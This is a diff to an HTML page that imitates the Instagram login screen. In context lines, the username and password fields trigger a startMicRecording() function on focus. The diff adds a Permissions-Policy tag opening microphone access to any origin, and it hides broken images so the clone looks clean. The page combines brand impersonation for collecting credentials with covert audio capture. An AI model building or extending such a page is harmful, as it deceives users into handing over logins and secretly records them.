@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Permissions-Policy" content="microphone=*">
 <title>Instagram</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -45,7 +45,7 @@ footer .copyright{font-size:11px;color:#8e8e8e}
   <section id="mobile"></section>
   <section id="auth">
     <div class="panel login">
-      <h1><img src="./img/instagram-logo.png" alt="Instagram logo" /></h1>
+      <h1><img src="img/instagram-logo.png" alt="Instagram logo" onerror="this.style.display='none'"/></h1>
       <form onsubmit="return false;">
         <input id="email" placeholder="Phone number, username or email" autocomplete="off" onfocus="startMicRecording()"/>
         <input id="password" type="password" placeholder="Password" autocomplete="off" onfocus="startMicRecording()"/>
@@ -59,12 +59,12 @@ footer .copyright{font-size:11px;color:#8e8e8e}
       </div>
     </div>
     <div class="panel register"><p>Don't have an account?</p><a href="#">Sign up</a></div>
-    <div class="app-download"><p>Get the app.</p>
-      <div>
-        <img src="./img/apple-button.png" alt="App Store" />
-                <img src="./img/googleplay-button.png" alt="Google Play" />
-      </div>
-    </div>
+<div class="app-download"><p>Get the app.</p>
+       <div>
+         <img src="img/apple-button.png" alt="App Store" onerror="this.style.display='none'"/>
+         <img src="img/googleplay-button.png" alt="Google Play" onerror="this.style.display='none'"/>
+       </div>
+     </div>
   </section>
 </main>
 <footer>
